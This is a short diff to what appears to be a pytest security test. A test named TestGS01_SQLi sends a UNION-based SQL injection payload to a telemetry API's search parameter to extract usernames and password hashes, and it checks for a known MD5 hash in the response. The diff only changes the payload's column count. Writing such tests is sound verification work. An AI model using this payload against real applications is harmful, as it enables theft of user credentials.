@@ -38,9 +38,8 @@ def operator(client):
 
 class TestGS01_SQLi:
     def test_extract_admin_hash(self, operator):
-        resp = operator.get(
-            "/api/telemetry?search=' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11 FROM users--&limit=100"
-        )
+        sqli = "' UNION SELECT 1,username,password_hash,role,5,6,7,8,9,10,11,12,13 FROM users--"
+        resp = operator.get(f"/api/telemetry?search={sqli}&limit=100")
         assert resp.status_code == 200
         data = str(resp.get_json())
         assert "5f4dcc3b" in data
